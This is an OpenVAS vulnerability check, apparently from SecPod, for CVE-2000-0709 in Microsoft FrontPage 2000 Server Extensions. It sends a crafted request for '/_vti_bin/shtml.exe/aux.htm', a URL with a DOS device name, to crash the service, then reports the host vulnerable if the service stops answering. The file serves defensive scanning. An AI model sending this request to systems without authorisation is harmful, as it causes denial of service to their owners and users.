##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ms_frontpage_ext_device_name_dos_vuln.nasl 13238 2019-01-23 11:14:26Z cfischer $
#
# Microsoft FrontPage Server Extensions MS-DOS Device Name DoS Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:microsoft:iis";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902839");
  script_version("$Revision: 13238 $");
  script_bugtraq_id(1608);
  script_cve_id("CVE-2000-0709");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-01-23 12:14:26 +0100 (Wed, 23 Jan 2019) $");
  script_tag(name:"creation_date", value:"2012-05-24 17:17:17 +0530 (Thu, 24 May 2012)");
  script_name("Microsoft FrontPage Server Extensions MS-DOS Device Name DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web Servers");
  script_dependencies("secpod_ms_iis_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("IIS/installed");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/5124");
  script_xref(name:"URL", value:"http://www.securiteam.com/windowsntfocus/5NP0N0U2AA.html");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2000-08/0288.html");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause denial of service
  conditions.");

  script_tag(name:"affected", value:"Microsoft FrontPage 2000 Server Extensions 1.1.");

  script_tag(name:"insight", value:"The flaw is due to an error in the 'shtml.exe' component, which
  allows remote attackers to cause a denial of service in some components
  by requesting a URL whose name includes a standard DOS device name.");

  script_tag(name:"solution", value:"Upgrade to Microsoft FrontPage 2000 Server Extensions 1.2 or later.");

  script_tag(name:"summary", value:"This host is running Microsoft FrontPage Server Extensions and is
  prone to denial of service vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

url = "/_vti_bin/shtml.exe";

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! get_app_location( cpe:CPE, port:port ) ) exit( 0 ); # To have a reference to the detection NVT

if( http_vuln_check( port:port, url:url, check_header:TRUE,
    pattern:"FrontPage Server Extensions", extra_check:"Server: Microsoft-IIS" ) ) {

  vulnurl = "/_vti_bin/shtml.exe/aux.htm";
  req = http_get( item:vulnurl, port:port );
  http_send_recv( port:port, data:req );

  req = http_get( item:url, port:port );
  res = http_send_recv( port:port, data:req );

  if( ! res ) {
    ## FrontPage Server Extensions are not running
    report = report_vuln_url( port:port, url:vulnurl );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );